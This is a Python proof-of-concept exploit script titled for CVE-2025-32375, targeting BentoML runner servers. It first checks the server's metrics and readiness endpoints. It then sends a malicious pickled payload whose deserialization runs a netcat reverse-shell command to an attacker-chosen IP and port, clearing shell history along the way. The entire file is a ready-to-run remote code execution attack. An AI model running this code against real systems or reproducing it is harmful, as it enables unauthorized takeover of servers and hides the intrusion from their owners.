import argparse
import requests
import pickle

def check_target(url):
    try:
        res = requests.get(f"{url}metrics", timeout=5)
        if res.status_code != 200 or 'bentoml_runner' not in res.text:
            print("[!] Hmm, BentoML runner server not detected.")
            return False
        
        res = requests.get(f"{url}readyz", timeout=5)
        if res.status_code != 200:
            print("[!] Server detected but not ready.")
            return False

        print("[*] BentoML runner server detected and ready!")
        return True
    except Exception as e:
        print(f"[!] Error checking target: {str(e)}")
        return False

def exploit(target_url, rev_ip, rev_port):
    headers = {
        "args-number": "1",
        "Content-Type": "application/vnd.bentoml.pickled",
        "Payload-Container": "NdarrayContainer",
        "Payload-Meta": '{"format": "default"}',
        "Batch-Size": "-1",
    }

    command = f"unset HISTFILE; export HISTFILE=/dev/null; export HISTFILESIZE=0; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {rev_ip} {rev_port} >/tmp/f"

    class P:
        def __reduce__(self):
            return (
                __import__("os").system,
                (command,),
            )

    try:
        response = requests.post(target_url, headers=headers, data=pickle.dumps(P()), timeout=10)
        print(f"[*] Exploit sent. Status code: {response.status_code if response else 'No response'}")
    except requests.exceptions.Timeout:
        print("\n[*] BOOM HEADSHOT!")
        print("[*] Enjoy your shell!")
    except Exception as e:
        print(f"[!] Error: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="POC for CVE-2025-32375")
    parser.add_argument("target_host", help="Target host IP")
    parser.add_argument("target_port", type=int, default=3000, nargs='?', help="Target port (default: 3000)")
    parser.add_argument("rev_ip", help="IP for reverse shell")
    parser.add_argument("rev_port", type=int, help="Port for reverse shell")
    
    args = parser.parse_args()
    target_url = f"http://{args.target_host}:{args.target_port}/"
    print(f"\n[*] Checking target...")
    if not check_target(target_url):
        exit(1)
    print(f"\n[*] Start a listener on {args.rev_ip}:{args.rev_port}")
    print(f"[*] Sending exploit...")
    print("[*] Check listener...")
    exploit(target_url, args.rev_ip, args.rev_port)